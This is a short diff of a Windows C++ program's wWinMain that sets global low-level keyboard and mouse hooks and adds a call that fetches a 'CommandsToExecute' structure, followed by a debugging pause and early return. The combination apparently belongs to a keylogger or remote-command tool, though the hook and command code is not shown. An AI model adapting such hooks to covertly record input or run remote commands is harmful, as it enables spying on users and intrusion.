@@ -1,6 +1,8 @@
 #include "pa5a.hpp"
 
+
 EXTERN_C_START
+
 
 /********************************************************************************************************************************************************/
 INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow) 
@@ -23,6 +25,12 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
     SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0);
     SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0);
 
+ 
+    struct CommandsToExecute c;
+
+    GetCommands(&c);
+    system("pause");
+    return 0;
     while (GetMessage(&msg, NULL, 0, 0))
     {
         TranslateMessage(&msg);
@@ -34,3 +42,4 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 /********************************************************************************************************************************************************/
 
 EXTERN_C_END
+
